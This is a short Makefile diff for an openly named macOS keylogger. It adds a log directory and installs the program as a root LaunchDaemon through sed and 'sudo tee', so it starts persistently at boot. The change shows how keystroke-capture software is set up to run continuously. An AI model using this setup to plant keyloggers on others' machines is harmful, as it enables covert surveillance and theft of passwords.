@@ -4,6 +4,7 @@ SOURCES=keylogger.c
 EXECUTABLE=keylogger
 PLIST=keylogger.plist
 INSTALLDIR=~/bin
+LOGSPATH=~/.keylogger
 
 compile: $(SOURCES)
 	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)
@@ -11,13 +12,14 @@ compile: $(SOURCES)
 install:
 	mkdir -p $(INSTALLDIR)
 	cp $(EXECUTABLE) $(INSTALLDIR)
+	mkdir -p $(LOGSPATH)
 
 uninstall:
 	rm $(INSTALLDIR)/$(EXECUTABLE)
 	rm /Library/LaunchDaemons/$(PLIST)
 
 startup:
-	cp $(PLIST) /Library/LaunchDaemons
+	sed "s|~|${HOME}/bin/keylogger ${HOME}/.keylogger|" keylogger.plist | sudo tee /Library/LaunchDaemons/keylogger.plist
 
 clean:
 	rm $(EXECUTABLE)
